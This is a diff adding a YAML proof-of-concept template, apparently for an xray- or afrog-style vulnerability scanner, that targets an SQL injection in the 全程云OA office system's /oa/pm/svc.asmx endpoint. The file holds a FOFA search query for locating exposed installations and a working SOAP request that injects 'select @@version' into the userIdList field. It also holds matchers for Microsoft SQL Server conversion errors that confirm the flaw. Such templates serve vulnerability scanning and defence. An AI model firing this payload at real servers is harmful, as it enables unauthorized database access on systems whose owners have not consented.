@@ -1,0 +1,22 @@
+id: poc-yaml-quan-cheng-yun-svc-asmx-sqli
+info:
+  name: 全程云OA svc.asmx SQL 注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 全程云OA
+  fofa: body="全程云OA" || body="images/yipeoplehover.png"
+requests:
+- method: POST
+  path: /oa/pm/svc.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: http://tempuri.org/GetUsersInfo
+  data: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
+    \ \nxmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    >\n<soap:Body>\n<GetUsersInfo xmlns=\"http://tempuri.org/\">\n<userIdList>select\
+    \ @@version</userIdList>\n</GetUsersInfo>\n</soap:Body>\n</soap:Envelope>"
+  expression: status_code == 500 && contains(body,"在将 nvarchar 值") && contains(body,"转换成数据类型
+    int 时失败") && contains(body,"Microsoft SQL Server") && contains(headers,"text/xml")
+variables: {}
+transport: http
